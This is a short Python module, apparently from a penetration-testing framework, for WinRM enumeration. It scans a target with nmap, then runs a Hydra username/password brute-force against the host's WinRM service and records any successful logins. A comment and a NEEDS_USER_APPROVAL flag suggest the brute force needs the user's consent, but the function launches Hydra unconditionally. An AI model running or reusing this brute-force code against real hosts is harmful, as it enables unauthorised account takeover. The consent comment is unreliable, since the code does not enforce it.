# scripts/enumeration/winrm_enum.py
import subprocess
from core.db_manager import DBManager

NEEDS_USER_APPROVAL = True  # Evil-WinRM or Hydra attempts can be intrusive

def enumerate_service(ip, port):
    print(f"[+] Starting WinRM enumeration on {ip}:{port}")
    db = DBManager()

    # Basic Nmap or custom script
    nmap_cmd = ["nmap", "-p", str(port), "--script", "http-winrm-version", ip]
    result = subprocess.run(nmap_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode != 0:
        print(f"[!] WinRM Nmap enumeration failed: {result.stderr}")
        return

    print(result.stdout)

    # Potential brute force with Hydra or evil-winrm if the user allows
    hydra_cmd = ["hydra", "-L", "userlist.txt", "-P", "passwords.txt", f"winrm://{ip}"]
    try:
        hydra_result = subprocess.run(hydra_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "login:" in hydra_result.stdout.lower():
            db.insert_note(host_ip=ip, service_port=port, note=f"WinRM brute force success:\n{hydra_result.stdout}")
    except FileNotFoundError:
        print("[!] Hydra not installed or not in PATH.")
